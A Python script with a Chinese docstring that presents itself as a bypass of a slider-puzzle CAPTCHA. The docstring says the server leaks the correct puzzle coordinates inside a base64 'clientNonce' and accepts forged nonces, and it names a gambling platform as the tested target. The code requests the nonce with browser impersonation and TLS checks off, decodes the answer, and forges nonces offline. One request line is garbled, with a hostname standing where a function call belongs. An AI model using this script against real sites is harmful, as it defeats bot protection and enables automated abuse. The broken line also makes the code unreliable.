# -*- coding: utf-8 -*-
"""
拼图滑块验证绕过：服务端在 clientNonce 中明文返回正确坐标
────────────────────────────────────────────────────────────
【原理】部分自研平台为防重放，要求客户端在完成滑块验证后把「服务端下发的
clientNonce」一并回传。但若服务端在**下发** clientNonce 时就把滑块正确坐标
（point.x / point.y）编码进去，则等价于把答案直接交给攻击者 ——
无需解图片、无需 OCR、无需图像识别，滑块验证形同虚设。

【实测】6686 博彩集团 https://example.com/platform/user/nonce
  请求需两项：
    · 请求头 x-uuid: <任意字符串>（无格式校验、无签名、无绑定）
    · body {"imageWidth":280,"imageHeight":155,"jigsawWidth":52,"jigsawHeight":52,"timestamp":<毫秒>}
  响应：
    {"msg":"","code":0,"data":{"clientNonce":"<base64>","time":...,"traceId":"..."}}
  clientNonce 解码：
    {"uuid":"<你传的 x-uuid>","point":{"x":118.0,"y":43.0}}   ← 正确坐标明文给出

【可伪造性】x-uuid 换成任意值均成功；因此 clientNonce 可完全离线构造：
    base64('{"uuid":"any","point":{"x":1.0,"y":2.0}}')
  → 无需再请求服务端。
"""
import base64, json, time, sys
from curl_cffi import requests

API = "https://example.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36")


def fetch_client_nonce(base=API, uuid="probe-uuid", origin=None):
    """向目标索取 clientNonce，并顺带解码出滑块正确坐标"""
    body = {"imageWidth": 280, "imageHeight": 155, "jigsawWidth": 52,
            "jigsawHeight": 52, "timestamp": int(time.time() * 1000)}
    h = {"User-Agent": UA, "Content-Type": "application/json", "x-uuid": uuid}
    if origin:
        h["Origin"] = origin
        h["Referer"] = origin + "/"
    r = target9.example.com(base + "/platform/user/nonce", headers=h,
                      data=json.dumps(body), timeout=15,
                      impersonate="chrome", verify=False)
    j = r.json()
    n = j.get("data", {}).get("clientNonce", "")
    if n:
        j["_decoded"] = json.loads(base64.b64decode(n))
    return j


def forge_client_nonce(uuid="forged", x=88.0, y=85.0):
    """离线伪造 clientNonce（因服务端不回校验 point 来源）"""
    return base64.b64encode(json.dumps(
        {"uuid": uuid, "point": {"x": x, "y": y}},
        separators=(",", ":")).encode()).decode()


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else API
    j = fetch_client_nonce(base, origin="https://example.com")
    print("[响应 ]", json.dumps(j, ensure_ascii=False)[:400])
    print("[伪造 ]", forge_client_nonce("any-uuid", 12.0, 34.0))
